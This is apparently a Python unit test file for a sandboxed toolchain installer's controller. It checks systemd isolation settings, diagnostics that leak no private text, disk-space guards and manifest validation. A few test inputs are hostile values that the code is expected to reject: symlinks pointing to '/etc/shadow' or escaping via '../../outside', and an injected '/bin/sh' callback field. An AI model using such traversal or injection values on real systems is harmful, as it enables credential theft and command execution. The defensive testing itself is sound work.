"""Bounded pure/mocked contract tests. These do not claim a Linux systemd/loop execution."""
import ast
import base64
import collections
import contextlib
import copy
import hashlib
import io
import json
import os
import pathlib
import re
import stat
import types
import unittest
from unittest import mock

RESOURCES = pathlib.Path(__file__).resolve().parents[2] / 'main/resources/gold/debug/windowstolinux/mod/deployment'
AGENT = RESOURCES / 'service/agent/toolchain'
SHARED = RESOURCES / 'linux/helper/toolchain'
OPERATION = '1234567890abcdef1234567890abcdef'


def resource(path):
    return path.read_text(encoding='utf-8').replace('\r\n', '\n')


def controller():
    metadata = resource(SHARED / '10-release-metadata.py') + '\n'
    resolution = resource(AGENT / 'agent-toolchain-resolution.py')
    resolver = metadata + resolution + "\nif __name__ == '__main__':\n    resolution_cli()\n"
    source = metadata + resolution + '\nEXPECTED_RESOLVER_SOURCE_SHA256 = ' + repr(hashlib.sha256(resolver.encode()).hexdigest()) + '\n' + resource(SHARED / 'archive-boundaries.py') + '\n' + resource(AGENT / 'agent-toolchain-controller.py')
    namespace = types.ModuleType('agent_contract')
    namespace.PROGRAM_SOURCE = source.encode()
    exec(compile(source, '<actual-agent-resources>', 'exec'), namespace.__dict__)
    namespace.ROOT = pathlib.PurePosixPath('/usr/local/lib/windowstolinux/toolchains')
    namespace.SHIPPED_CATALOG = {'JAVA': ['8', '21'], 'NODE': ['22'], 'PYTHON': ['3.12'],
        'DOTNET': ['8'], 'KOTLIN': ['2.0'], 'GO': ['1.24'], 'RUST': ['1.95'], 'PHP': ['8.4'], 'RUBY': ['3.0', '3.4']}
    return namespace


def dependencies():
    text = resource(AGENT / 'dependency-packages.json')
    source = 'import json\nDEPENDENCY_PACKAGES=json.loads(' + repr(text) + ')\n' + resource(AGENT / 'agent-toolchain-dependencies.py')
    namespace = types.ModuleType('dependency_contract')
    exec(compile(source, '<actual-dependency-resources>', 'exec'), namespace.__dict__)
    return namespace, source


def info(mode=stat.S_IFREG | 0o644, inode=1, links=1, size=5, device=5):
    return types.SimpleNamespace(st_mode=mode, st_dev=device, st_ino=inode, st_nlink=links,
        st_size=size, st_uid=123, st_gid=123, st_mtime_ns=10, st_ctime_ns=10)


class AgentToolchainIsolationTest(unittest.TestCase):
    def setUp(self):
        self.c = controller()

    @contextlib.contextmanager
    def system_process(self, output, exit_code):
        process = mock.Mock()
        process.wait.return_value = exit_code
        process.poll.return_value = exit_code
        process.stdout.fileno.return_value = 42
        selector = mock.MagicMock()
        selector.__enter__.return_value = selector
        selector.get_map.side_effect = ({1: True}, {1: True}, {})
        selector.select.return_value = [(types.SimpleNamespace(fileobj=process.stdout), 1)]
        with mock.patch.object(self.c.subprocess, 'Popen', return_value=process) as popen, \
             mock.patch.object(self.c.selectors, 'DefaultSelector', return_value=selector), \
             mock.patch.object(self.c.os, 'read', side_effect=(output, b'')), \
             mock.patch.object(self.c.os, 'killpg', create=True) as kill, \
             mock.patch.object(self.c.time, 'monotonic', return_value=0):
            yield process, popen, kill

    def test_system_command_failure_reports_only_fixed_tool_exit_and_output_digest(self):
        private = b'PRIVATE_CONFIG_BODY and root path /private/body\n'
        args = ['prepare', 'RUST', '1.95', '1.95.0', '60', '-', OPERATION, 'fixture-release']
        for path, command in (('/usr/bin/fallocate', 'fallocate'), ('/usr/sbin/mke2fs', 'mke2fs'),
                ('/private/unknown-tool', 'UNCLASSIFIED')):
            with self.subTest(path=path), self.system_process(private, 1) as (process, popen, kill):
                with self.assertRaises(self.c.PreparationFailure) as rejected:
                    self.c.agent_os([path, '--fixed-interface'])
            self.assertEqual('SYSTEM_COMMAND_FAILED', rejected.exception.detail)
            self.assertEqual('isolation', rejected.exception.category)
            output = io.StringIO()
            with contextlib.redirect_stdout(output), mock.patch.object(self.c, 'agent_main', side_effect=rejected.exception):
                self.assertEqual(65, self.c.agent_cli(args))
            lines = output.getvalue().splitlines()
            self.assertEqual('TOOLCHAIN_FAILURE=isolation:SYSTEM_COMMAND_FAILED', lines[0])
            value = json.loads(lines[1].removeprefix('TOOLCHAIN_DIAGNOSTIC='))
            self.assertEqual({'operation': OPERATION, 'phase': 'SYSTEM_COMMAND_FAILED', 'command': command,
                'exitCode': 1, 'outputBytes': len(private), 'outputSha256': hashlib.sha256(private).hexdigest()}, value)
            self.assertNotIn('PRIVATE_CONFIG_BODY', output.getvalue())
            self.assertNotIn('/private/', output.getvalue())
            self.assertNotIn('--fixed-interface', output.getvalue())
            process.stdout.close.assert_called_once()
            kill.assert_not_called()
            popen.assert_called_once()

    def test_allowed_system_nonzero_and_success_keep_original_result_without_diagnostic(self):
        for code, allowed in ((2, True), (0, False)):
            with self.subTest(code=code), self.system_process(b'current-native-output', code) as (process, _, kill):
                self.assertEqual((code, b'current-native-output'), self.c.agent_os(['/usr/bin/systemctl', 'show'], allow_failure=allowed))
            process.stdout.close.assert_called_once()
            kill.assert_not_called()

    def test_all_diagnostics_bind_canonical_operation_and_never_encoded_binding_text(self):
        private = 'PRIVATE_ENCODED_BINDING'
        frames = (['prepare', 'RUST', '1.95', '1.95.0', '60', '-', OPERATION, 'fixture-release'],
                  ['bind', private, '60', OPERATION], ['setup', OPERATION], ['freeze', OPERATION], ['worker', OPERATION])
        error = self.c.PreparationFailure('isolation', 'SYSTEM_COMMAND_FAILED')
        error.command_diagnostic = {'command': 'mount', 'exitCode': -9, 'outputBytes': 0, 'outputSha256': hashlib.sha256(b'').hexdigest()}
        for args in frames:
            with self.subTest(frame=args[0]):
                self.assertEqual(OPERATION, self.c.agent_diagnostic_operation(args))
                line = self.c.agent_command_diagnostic(error, args)
                self.assertEqual(OPERATION, json.loads(line.removeprefix('TOOLCHAIN_DIAGNOSTIC='))['operation'])
                self.assertNotIn(private, line)
                unknown = self.c.agent_exception_diagnostic(OSError(28, 'private-body'), args)
                self.assertEqual(OPERATION, json.loads(unknown.removeprefix('TOOLCHAIN_DIAGNOSTIC='))['operation'])
                self.assertNotIn('private-body', unknown)
        args = frames[0]
        original = dict(error.command_diagnostic)
        for field, invalid in (('command', '/private/tool'), ('exitCode', True), ('exitCode', 0), ('exitCode', 256),
                ('outputBytes', -1), ('outputBytes', 65537), ('outputSha256', 'private-body'), ('rawOutput', 'private-body')):
            error.command_diagnostic = {**original, field: invalid}
            self.assertIsNone(self.c.agent_command_diagnostic(error, args))
        for args in (['bind', OPERATION, '60', private], ['prepare', 'RUST', '1.95', '1.95.0', '60', '-', private, OPERATION], ['cleanup', OPERATION]):
            self.assertIsNone(self.c.agent_diagnostic_operation(args))
            self.assertIsNone(self.c.agent_exception_diagnostic(OSError(28, 'private-body'), args))

    def test_controller_exception_diagnostic_keeps_unknown_without_paths_or_exception_text(self):
        args = ['prepare', 'RUST', '1.95', '-', '600', '-', OPERATION, 'descriptor']
        private = '/private/path-do-not-copy'
        stream = io.StringIO()
        with mock.patch.object(self.c, 'agent_main', side_effect=FileNotFoundError(2, private)), contextlib.redirect_stdout(stream):
            self.assertEqual(70, self.c.agent_cli(args))
        lines = stream.getvalue().splitlines()
        self.assertEqual('TOOLCHAIN_FAILURE=unknown:AGENT_TOOLCHAIN_STATE_UNCONFIRMED', lines[0])
        diagnostic = json.loads(lines[1].removeprefix('TOOLCHAIN_DIAGNOSTIC='))
        self.assertEqual({'operation': OPERATION, 'phase': 'AGENT_TOOLCHAIN_STATE_UNCONFIRMED',
            'function': 'entry', 'line': 0, 'exception': 'OSError', 'errno': 2}, diagnostic)
        self.assertNotIn(private, stream.getvalue())
        self.assertLess(len(lines[1]), 512)

    def test_controller_diagnostic_selects_actual_assembled_frame_and_never_an_exception_chain(self):
        args = ['prepare', 'RUST', '1.95', '-', 'bad-private-number', '-', OPERATION, 'descriptor']
        stream = io.StringIO()
        def invoke(_):
            try:
                raise FileNotFoundError(2, 'prior-private-cause')
            except OSError:
                self.c.agent_prepare(args[1:])
        with mock.patch.object(self.c, 'agent_main', side_effect=invoke), contextlib.redirect_stdout(stream):
            self.assertEqual(70, self.c.agent_cli(args))
        diagnostic = json.loads(stream.getvalue().splitlines()[1].removeprefix('TOOLCHAIN_DIAGNOSTIC='))
        self.assertEqual('agent_prepare', diagnostic['function'])
        self.assertEqual('ValueError', diagnostic['exception'])
        self.assertIsNone(diagnostic['errno'])
        self.assertGreater(diagnostic['line'], self.c.agent_prepare.__code__.co_firstlineno)
        self.assertLess(diagnostic['line'], self.c.agent_prepare.__code__.co_firstlineno + 10)
        self.assertNotIn('bad-private-number', stream.getvalue())
        self.assertNotIn('prior-private-cause', stream.getvalue())

    def test_controller_diagnostic_invalid_operations_and_known_rejections_keep_original_exit_protocol(self):
        error = OSError(2, 'private-body')
        for args in (['prepare', 'RUST', '1.95', '-', '600', '-', '../invalid', 'descriptor'], ['unknown', OPERATION]):
            self.assertIsNone(self.c.agent_exception_diagnostic(error, args))
        stream = io.StringIO()
        with mock.patch.object(self.c, 'agent_main', side_effect=self.c.PreparationFailure('ownership', 'PROTECTED_FILE')), contextlib.redirect_stdout(stream):
            self.assertEqual(65, self.c.agent_cli(['bind', OPERATION, '60', 'descriptor']))
        self.assertEqual('TOOLCHAIN_FAILURE=ownership:PROTECTED_FILE\n', stream.getvalue())

    def rejected(self, tag, call):
        with self.assertRaises(self.c.PreparationFailure) as failure:
            call()
        self.assertEqual(tag, failure.exception.detail)

    def manifest(self):
        return {'format': 'WTL_AGENT_TOOLCHAIN_1', 'operation': OPERATION,
            'programSha256': hashlib.sha256(self.c.PROGRAM_SOURCE).hexdigest(), 'seconds': 60,
            'deadline': 999999999, 'action': 'PROBE', 'request': {'probes': [{
                'ecosystem': 'RUST', 'version': '1.95.0',
                'directory': str(self.c.ROOT) + '/versions/rust-' + 'a' * 64}], 'javaHome': '-'},
            'directories': {key: [5, index] for index, key in enumerate(('out', 'work', 'home', 'tmp'), 1)},
            'loop': '/dev/loop9', 'imageIdentity': [5, 10], 'mountIdentity': [5, 11], 'readyIdentity': [5, 12]}

    def parse_manifest(self, value):
        fake_pathlib = types.SimpleNamespace(Path=pathlib.PurePosixPath)
        def read(path, maximum=65536):
            return self.c.PROGRAM_SOURCE if path.name == 'controller.py' else self.c.agent_encode(value)
        with mock.patch.object(self.c, 'pathlib', fake_pathlib), mock.patch.object(self.c, 'owned_directory'), mock.patch.object(self.c, 'agent_regular', read):
            return self.c.agent_manifest(OPERATION)

    def test_actual_resources_compile_without_importing_old_root_installer(self):
        self.assertTrue(callable(self.c.release))
        self.assertTrue(callable(self.c.extract))
        self.assertFalse(hasattr(self.c, 'install'))
        self.assertFalse(hasattr(self.c, 'probe'))
        self.assertFalse(hasattr(self.c, 'run'))
        d, source = dependencies()
        self.assertEqual(1, source.count('DEPENDENCY_PACKAGES='))
        actual = json.loads(resource(AGENT / 'dependency-packages.json'))
        for manager in ('APT', 'DNF'):
            for ecosystem in ('PYTHON', 'PHP', 'RUBY'):
                self.assertEqual(actual[manager][ecosystem], d.dependency_packages(manager, ecosystem))

    def test_installation_keys_match_original_all_nine_ecosystems(self):
        old = ast.parse(resource(SHARED / '30-managed-installation.py'))
        definition = next(node for node in old.body if isinstance(node, ast.FunctionDef) and node.name == 'installation_key')
        namespace = {'hashlib': hashlib, 'version_key': self.c.version_key}
        exec(compile(ast.Module(body=[definition], type_ignores=[]), '<original-key>', 'exec'), namespace)
        versions = {'JAVA': '8u412-b08', 'NODE': '22.1.0', 'PYTHON': '3.12.7', 'DOTNET': '8.0.100',
            'KOTLIN': '2.0.0', 'GO': '1.24.0', 'RUST': '1.95.0', 'PHP': '8.4.1', 'RUBY': '3.0.7'}
        for ecosystem, version in versions.items():
            with self.subTest(ecosystem=ecosystem):
                self.assertEqual(namespace['installation_key'](ecosystem, version, 'a' * 64),
                    self.c.agent_installation_key(ecosystem, version, 'a' * 64))
        self.assertNotEqual(self.c.agent_installation_key('RUBY', '3.0.7', 'a' * 64),
            hashlib.sha256(('RUBY\n3.0.7\n' + 'a' * 64).encode()).hexdigest())

    def test_manifest_rejects_duplicate_trailing_unknown_and_source_mismatch(self):
        for payload in (b'{"operation":"a","operation":"b"}', b'{} trailing', b'{"x":NaN}'):
            with self.subTest(payload=payload), self.assertRaises(self.c.PreparationFailure):
                self.c.agent_json(payload)
        good = self.manifest()
        self.assertEqual(good, self.parse_manifest(good))
        bad = copy.deepcopy(good)
        bad['additional'] = True
        self.rejected('MANIFEST_SCHEMA', lambda: self.parse_manifest(bad))
        bad = copy.deepcopy(good)
        bad['programSha256'] = 'b' * 64
        self.rejected('PROGRAM_BINDING', lambda: self.parse_manifest(bad))
        bad = copy.deepcopy(good)
        bad['request']['callback'] = '/bin/sh'
        self.rejected('PROBE_SCHEMA', lambda: self.parse_manifest(bad))
        bad = copy.deepcopy(good)
        bad['seconds'] = True
        self.rejected('MANIFEST_DEADLINE', lambda: self.parse_manifest(bad))
        bad = copy.deepcopy(good)
        bad['directories']['work'] = [0, 1]
        self.rejected('MANIFEST_DIRECTORY_INODE', lambda: self.parse_manifest(bad))
        bad = copy.deepcopy(good)
        bad['readyIdentity'] = [5, True]
        self.rejected('MANIFEST_INODE', lambda: self.parse_manifest(bad))

    def test_every_vendor_probe_is_rejected_at_root_before_process_creation(self):
        with mock.patch.object(self.c.os, 'geteuid', return_value=0, create=True), mock.patch.object(self.c.subprocess, 'Popen') as popen:
            for ecosystem in self.c.AGENT_ECOSYSTEMS:
                with self.subTest(ecosystem=ecosystem):
                    self.rejected('ROOT_VENDOR_EXECUTION_FORBIDDEN',
                        lambda: self.c.agent_probe(ecosystem, '/vendor', '3.0.0', '-'))
            self.rejected('WORKER_REQUIRES_NONROOT', lambda: self.c.agent_worker(OPERATION))
            popen.assert_not_called()

    def test_unit_limits_identity_socket_isolation_and_real_prefix_are_fixed(self):
        manifest = self.manifest()
        manifest['action'] = 'INSTALL'
        manifest['request'] = {'destination': str(self.c.ROOT) + '/versions/rust-' + 'a' * 64}
        properties = self.c.agent_sandbox_properties(manifest)
        for expected in ('DynamicUser=yes', 'NoNewPrivileges=yes', 'CapabilityBoundingSet=',
                'AmbientCapabilities=', 'PrivateNetwork=yes', 'RestrictNamespaces=yes',
                'Delegate=no', 'KillMode=control-group', 'MemoryMax=2147483648', 'TasksMax=256'):
            self.assertIn(expected, properties)
        self.assertIn('User=' + self.c.agent_user(OPERATION), properties)
        self.assertIn('TemporaryFileSystem=/run:ro', properties)
        self.assertIn('WorkingDirectory=/', properties)
        bind = next(v for v in properties if v.startswith('BindPaths='))
        self.assertIn('mutable/out:' + manifest['request']['destination'], bind)
        self.assertFalse(any(v.startswith(('ExecStartPre=', 'ExecStopPost=')) for v in properties))
        self.assertTrue(any('ready.json:' + str(self.c.AGENT_ALIAS / 'ready.json') in v for v in properties))
        self.assertEqual('windowstolinux-toolchain-' + OPERATION + '.service', self.c.agent_unit(OPERATION))
        self.assertTrue(any('-/run/dbus' in v and '-/var/opt/windowstolinux/apps' in v for v in properties))

    def test_volume_space_check_stops_before_operation_files_or_allocation(self):
        created = []
        class Path(pathlib.PurePosixPath):
            def exists(self): return not self.name.startswith('agent-')
            def is_symlink(self): return False
            def mkdir(self, **_): created.append(str(self))
            def read_text(self): return 'memory pids\n'
        filesystem = types.SimpleNamespace(f_frsize=4096, f_bavail=635972, f_bfree=20 * 1024 * 1024)
        with mock.patch.object(self.c, 'ROOT', Path('/root/toolchains')), \
             mock.patch.object(self.c.pathlib, 'Path', Path), mock.patch.object(self.c, 'owned_directory'), \
             mock.patch.dict('sys.modules', {'pwd': types.SimpleNamespace(getpwnam=mock.Mock(side_effect=KeyError))}), \
             mock.patch.object(self.c.os, 'geteuid', return_value=0, create=True), \
             mock.patch.object(self.c.os, 'statvfs', return_value=filesystem, create=True), \
             mock.patch.object(self.c, 'agent_tool', lambda name: '/usr/bin/' + name), \
             mock.patch.object(self.c, 'agent_os', return_value=(0, b'not-found\n')) as commands, \
             mock.patch.object(self.c, 'agent_write') as writes:
            with self.assertRaises(self.c.PreparationFailure) as rejected:
                self.c.agent_create(OPERATION, 60)
        self.assertEqual('HOST_SPACE_REQUIRED', rejected.exception.detail)
        self.assertEqual(635972 * 4096, rejected.exception.diagnostic['availableBytes'])
        self.assertEqual(self.c.AGENT_VOLUME_BYTES + self.c.AGENT_HOST_RESERVE_BYTES, rejected.exception.diagnostic['requiredBytes'])
        self.assertFalse(any('/agent-' in path for path in created))
        writes.assert_not_called()
        self.assertEqual(1, commands.call_count)
        self.assertEqual('/usr/bin/systemctl', commands.call_args.args[0][0])

    def test_space_threshold_uses_available_blocks_and_preserves_host_reserve(self):
        minimum = self.c.AGENT_VOLUME_BYTES + self.c.AGENT_HOST_RESERVE_BYTES
        for available, accepted in ((minimum - 4096, False), (minimum, True), (minimum + 4096, True)):
            filesystem = types.SimpleNamespace(f_frsize=4096, f_bavail=available // 4096, f_bfree=2 ** 40)
            with self.subTest(available=available), mock.patch.object(self.c, 'owned_directory'), \
                 mock.patch.object(self.c.os, 'statvfs', return_value=filesystem, create=True):
                if accepted:
                    self.c.agent_require_space('/root/work', OPERATION, 'VOLUME')
                else:
                    self.rejected('HOST_SPACE_REQUIRED', lambda: self.c.agent_require_space('/root/work', OPERATION, 'VOLUME'))
        with mock.patch.object(self.c, 'owned_directory'), \
             mock.patch.object(self.c.os, 'statvfs', return_value=types.SimpleNamespace(f_frsize=0, f_bavail=100), create=True):
            self.rejected('FILESYSTEM_SPACE_UNCONFIRMED', lambda: self.c.agent_require_space('/root/work', OPERATION, 'VOLUME'))

    def test_promotion_space_counts_independent_hardlink_copies_and_block_overhead(self):
        entries = {'a': (info(size=5, links=2), None), 'b': (info(size=5, links=2), None),
                   'directory': (info(mode=stat.S_IFDIR | 0o755), None)}
        self.c.agent_validate_tree(entries)
        filesystem = types.SimpleNamespace(f_frsize=4096, f_bavail=0)
        with mock.patch.object(self.c, 'owned_directory'), \
             mock.patch.object(self.c.os, 'statvfs', return_value=filesystem, create=True):
            with self.assertRaises(self.c.PreparationFailure) as rejected:
                self.c.agent_require_space('/root/versions/stage', OPERATION, 'PROMOTION', entries)
        self.assertEqual('HOST_SPACE_REQUIRED', rejected.exception.detail)
        self.assertEqual(self.c.AGENT_HOST_RESERVE_BYTES + 2 * 4096 + 3 * 4096, rejected.exception.diagnostic['requiredBytes'])

    def test_low_promotion_space_never_copies_or_detaches_frozen_output(self):
        manifest = self.manifest()
        class Path(pathlib.PurePosixPath):
            def exists(self): return False
            def is_symlink(self): return False
            def mkdir(self, **_): pass
            def iterdir(self): return iter(())
        with mock.patch.object(self.c, 'ROOT', Path('/root')), mock.patch.object(self.c, 'agent_stopped'), \
             mock.patch.object(self.c, 'agent_identity', return_value=[5, 1]), mock.patch.object(self.c, 'owned_directory'), \
             mock.patch.object(self.c.os, 'O_DIRECTORY', 0x10000, create=True), \
             mock.patch.object(self.c.os, 'O_NOFOLLOW', 0x20000, create=True), \
             mock.patch.object(self.c.os, 'open', return_value=99), mock.patch.object(self.c.os, 'close'), \
             mock.patch.object(self.c.os, 'statvfs', return_value=types.SimpleNamespace(f_frsize=4096, f_bavail=0), create=True), \
             mock.patch.object(self.c, 'agent_scan', return_value={'x': (info(), None)}), \
             mock.patch.object(self.c, 'agent_copy_tree') as copying, mock.patch.object(self.c, 'agent_detach') as detach:
            self.rejected('HOST_SPACE_REQUIRED', lambda: self.c.agent_promote(manifest, Path('/root/versions/final'), [5, 1], {}))
        copying.assert_not_called()
        detach.assert_not_called()

    def test_space_diagnostic_is_current_numeric_data_without_paths_or_arbitrary_text(self):
        values = {'operation': OPERATION, 'phase': 'HOST_SPACE_REQUIRED', 'stage': 'VOLUME', 'availableBytes': 0,
                  'requiredBytes': self.c.AGENT_VOLUME_BYTES + self.c.AGENT_HOST_RESERVE_BYTES,
                  'reserveBytes': self.c.AGENT_HOST_RESERVE_BYTES}
        args = ['prepare', 'RUST', '1.95', '1.95.0', '60', '-', OPERATION, 'fixture-release']
        error = self.c.PreparationFailure('isolation', 'HOST_SPACE_REQUIRED')
        error.diagnostic = values
        output = io.StringIO()
        with contextlib.redirect_stdout(output), mock.patch.object(self.c, 'agent_main', side_effect=error):
            self.assertEqual(65, self.c.agent_cli(args))
        lines = output.getvalue().splitlines()
        self.assertEqual('TOOLCHAIN_FAILURE=isolation:HOST_SPACE_REQUIRED', lines[0])
        self.assertEqual(values, json.loads(lines[1].removeprefix('TOOLCHAIN_DIAGNOSTIC=')))
        for field, invalid in (('operation', 'f' * 32), ('phase', 'private-body'), ('stage', 'private-body'),
                ('availableBytes', True), ('availableBytes', values['requiredBytes']), ('requiredBytes', 0),
                ('reserveBytes', 0), ('path', '/private/body')):
            error.diagnostic = {**values, field: invalid}
            self.assertIsNone(self.c.agent_space_diagnostic(error, args))
        self.assertIsNone(self.c.agent_space_diagnostic(error, ['worker', OPERATION]))

    def test_output_links_cannot_escape_through_chain_or_absolute_target(self):
        names = {'bin', 'bin/tool', 'lib', 'lib/version'}
        self.assertEqual('lib/version', self.c.agent_resolve_link('bin/tool', '../lib/version', {}, names))
        for target, links in (('/etc/shadow', {}), ('../../outside', {}),
                ('alias/file', {'alias': '../../outside'}), ('loop', {'bin/loop': 'loop'})):
            with self.subTest(target=target), self.assertRaises(self.c.PreparationFailure):
                self.c.agent_resolve_link('bin/tool', target, links, names)

    def test_promotion_rejects_special_setid_capabilities_and_external_hardlinks(self):
        for entry in (info(stat.S_IFIFO | 0o600), info(stat.S_IFCHR | 0o600),
                info(stat.S_IFREG | 0o4755), info(device=6)):
            with self.subTest(mode=entry.st_mode), self.assertRaises(self.c.PreparationFailure):
                self.c.agent_validate_entry(entry, 5)
        self.rejected('UNSAFE_OUTPUT_METADATA', lambda: self.c.agent_validate_entry(info(), 5, b'cap'))
        self.rejected('EXTERNAL_OUTPUT_HARDLINK', lambda: self.c.agent_validate_tree({'tool': (info(links=2), None)}))
        self.c.agent_validate_tree({'a': (info(links=2), None), 'b': (info(links=2), None)})
        self.rejected('VENDOR_COMPLETION_MARKER', lambda: self.c.agent_validate_tree({'.w2l-toolchain.json': (info(), None)}))
        self.rejected('EMPTY_OUTPUT', lambda: self.c.agent_validate_tree({}))

    def test_nonmatching_frozen_receipt_and_unknown_unit_never_confirm_stop(self):
        manifest = self.manifest()
        fixed = b'LoadState=not-found\nActiveState=inactive\nControlGroup=\n'
        for output, receipt in ((b'', {}), (fixed, {'operation': 'f' * 32}),
                (fixed + b'ActiveState=inactive\n', {})):
            with self.subTest(output=output), mock.patch.object(self.c, 'agent_tool', lambda n: '/usr/bin/' + n), mock.patch.object(self.c, 'agent_os', return_value=(0, output)), mock.patch.object(self.c, 'agent_regular', return_value=json.dumps(receipt).encode()), mock.patch.object(self.c, 'agent_volume') as volume:
                with self.assertRaises(self.c.PreparationFailure):
                    self.c.agent_stopped(manifest)
                volume.assert_not_called()

    def test_failed_freeze_overrides_worker_success_without_publishing(self):
        manifest = self.manifest()
        with self.execution(manifest) as events, mock.patch.object(self.c, 'agent_freeze', side_effect=self.c.PreparationFailure('unknown', 'VOLUME_NOT_FROZEN')), mock.patch.object(self.c, 'agent_promote') as promote:
            with self.assertRaises(self.c.PreparationFailure) as failure:
                self.c.agent_execute(manifest)
            self.assertEqual('AGENT_FREEZE_UNCONFIRMED', failure.exception.detail)
            self.assertEqual(0, failure.exception.lifecycle_diagnostic['exitCode'])
            promote.assert_not_called()

    def test_existing_operation_is_not_reused_or_removed(self):
        class ExistingPath:
            name = 'work'
            def __truediv__(self, _): return self
            def mkdir(self, **_): pass
            def exists(self): return True
        existing = ExistingPath()
        with mock.patch.dict('sys.modules', {'pwd': types.SimpleNamespace()}), mock.patch.object(self.c, 'ROOT', existing), mock.patch.object(self.c, 'agent_operation', return_value=existing), mock.patch.object(self.c, 'owned_directory'), mock.patch.object(self.c.os, 'geteuid', return_value=0, create=True), mock.patch.object(self.c, 'agent_os') as commands:
            self.rejected('OPERATION_ALREADY_EXISTS', lambda: self.c.agent_create(OPERATION, 60))
            commands.assert_not_called()
        for value in ('../escape', 'A' * 32, OPERATION + '/extra'):
            self.rejected('OPERATION_ID', lambda: self.c.agent_operation(value))

    def test_started_operation_is_never_cleaned_as_prestart(self):
        class StartedPath:
            def __truediv__(self, _): return self
            def exists(self): return True
        with mock.patch.object(self.c, 'agent_operation', return_value=StartedPath()), mock.patch.object(self.c, 'agent_os') as commands:
            self.assertFalse(self.c.agent_cleanup_before_start(self.manifest()))
            commands.assert_not_called()

    def test_cached_managed_installation_must_match_all_official_metadata(self):
        manifest = self.manifest()
        expected = 'a' * 64
        key = self.c.agent_installation_key('RUST', '1.95.0', expected)
        class Directory:
            def __init__(self, path): self.path = path
            def __str__(self): return self.path
            def __truediv__(self, part): return Directory(self.path + '/' + part)
            def exists(self): return True
        root = Directory('/usr/local/lib/windowstolinux/toolchains')
        directory = str(root / 'versions' / ('rust-' + key))
        record = {'ecosystem': 'RUST', 'version': '1.95.0', 'directory': directory, 'origin': 'MANAGED',
            'source': 'https://static.rust-lang.org/archive', 'official_algorithm': 'sha256',
            'official_digest': expected, 'sha256': expected}
        for field, bad in (('origin', 'SYSTEM'), ('source', 'https://github.com/different'),
                ('official_algorithm', 'sha512'), ('official_digest', 'b' * 64),
                ('version', '1.94.0'), ('directory', '/other'), ('sha256', 'b' * 64)):
            changed = dict(record, **{field: bad})
            with self.subTest(field=field), mock.patch.object(self.c, 'ROOT', root), mock.patch.object(self.c, 'agent_system', return_value=None), mock.patch.object(self.c, 'agent_record', return_value=changed), mock.patch.object(self.c, 'agent_probe_records') as probe:
                self.rejected('EXISTING_INSTALLATION_MISMATCH', lambda: self.c.agent_prepare_selected(
                    manifest, 'RUST', '1.95.0', record['source'], 'sha256', expected, 'rust', '-'))
                probe.assert_not_called()

    def test_setup_only_chowns_four_original_empty_directories_to_positive_unit_identity(self):
        manifest = self.manifest()
        identity = {'operation': OPERATION, 'uid': 0, 'gid': 0, 'programSha256': manifest['programSha256']}
        descriptors, changes = {}, []
        def opening(path, flags):
            fd = len(descriptors) + 10
            descriptors[fd] = pathlib.PurePosixPath(path).name
            return fd
        def stat_fd(fd):
            name = descriptors[fd]
            return types.SimpleNamespace(st_dev=5, st_ino=manifest['directories'][name][1],
                st_uid=0, st_mode=stat.S_IFDIR | 0o755)
        selected = {'uid': 1234, 'gid': 1234, 'invocationId': 'e' * 32}
        with (mock.patch.object(self.c.os, 'geteuid', return_value=0, create=True),
              mock.patch.object(self.c, 'agent_manifest', return_value=manifest),
              mock.patch.object(self.c, 'agent_volume'),
              mock.patch.object(self.c.os, 'O_DIRECTORY', 0x10000, create=True),
              mock.patch.object(self.c.os, 'O_NOFOLLOW', 0x20000, create=True),
              mock.patch.object(self.c, 'agent_regular', return_value=json.dumps(identity).encode()),
              mock.patch.object(self.c.os, 'open', opening), mock.patch.object(self.c.os, 'fstat', stat_fd),
              mock.patch.object(self.c.os, 'listdir', return_value=[]),
              mock.patch.object(self.c.os, 'fchown', lambda fd, uid, gid: changes.append((descriptors[fd], uid, gid)), create=True),
              mock.patch.object(self.c.os, 'fchmod', create=True), mock.patch.object(self.c.os, 'ftruncate'),
              mock.patch.object(self.c.os, 'write', side_effect=lambda _, value: len(value)), mock.patch.object(self.c.os, 'fsync'),
              mock.patch.object(self.c.os, 'close')):
            self.c.agent_setup(OPERATION, selected)
        self.assertEqual([(name, 1234, 1234) for name in ('out', 'work', 'home', 'tmp')], changes)
        with mock.patch.object(self.c.os, 'geteuid', return_value=0, create=True), mock.patch.object(self.c, 'agent_manifest', return_value=manifest), mock.patch.object(self.c, 'agent_volume'), mock.patch.object(self.c.os, 'fchown', create=True) as chown:
            self.rejected('DYNAMIC_IDENTITY', lambda: self.c.agent_setup(OPERATION, dict(selected, uid=0)))
            chown.assert_not_called()

    def test_install_and_final_probe_all_layouts_execute_only_in_nonroot_worker(self):
        manifest = self.manifest()
        class Path:
            def __init__(self, value): self.value = str(value)
            def __truediv__(self, name): return Path(self.value + '/' + name)
            def __str__(self): return self.value
            def lstat(self):
                name = self.value.rsplit('/', 1)[-1]
                return types.SimpleNamespace(st_dev=5, st_ino=manifest['directories'][name][1],
                    st_uid=123, st_mode=stat.S_IFDIR | 0o700)
            def stat(self):
                return types.SimpleNamespace(st_dev=5, st_ino=manifest['directories']['out'][1])
            def read_text(self): return 'CapEff:\t0000000000000000\nNoNewPrivs:\t1\n'
        versions = {'JAVA': '21.0.1', 'NODE': '22.1.0', 'PYTHON': '3.12.7', 'DOTNET': '8.0.100',
            'KOTLIN': '2.0.0', 'GO': '1.24.0', 'RUST': '1.95.0', 'PHP': '8.4.1', 'RUBY': '3.0.7'}
        layouts = {'JAVA': 'archive', 'NODE': 'archive', 'PYTHON': 'python', 'DOTNET': 'flat',
            'KOTLIN': 'archive', 'GO': 'archive', 'RUST': 'rust', 'PHP': 'php', 'RUBY': 'ruby'}
        for ecosystem, version in versions.items():
            manifest['action'] = 'INSTALL'
            manifest['request'] = {'ecosystem': ecosystem, 'version': version, 'destination': '/final/' + ecosystem,
                'layout': layouts[ecosystem], 'javaHome': '-', 'legacyGem': ecosystem == 'RUBY'}
            commands = []
            def vendor(command, environment, cwd=None, capture=False):
                self.assertEqual(123, self.c.os.geteuid())
                self.assertEqual('/final/' + ecosystem + '/bin', environment['PATH'].split(':')[0])
                commands.append(command)
                return version if capture else ''
            identity = {'operation': OPERATION, 'uid': 123, 'gid': 123, 'programSha256': manifest['programSha256']}
